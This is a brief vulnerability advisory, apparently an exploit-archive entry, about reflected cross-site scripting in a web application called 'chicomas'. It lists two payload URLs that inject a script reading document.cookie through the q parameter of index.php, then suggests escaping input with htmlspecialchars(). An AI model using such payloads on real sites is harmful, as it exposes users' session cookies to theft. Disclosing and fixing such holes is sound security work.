Exploit :

Method = POST

query : http://www.example.com/[chicomas]/index.php?q=>"><script>alert(document.cookie)</script>
query : http://www.example.com/[chicomas]/index.php?q="><script>alert(document.cookie)</script>

-----------------------------------------------------------------------------------

Solution :
 
you must filter special character in input via htmlspecialchar() function

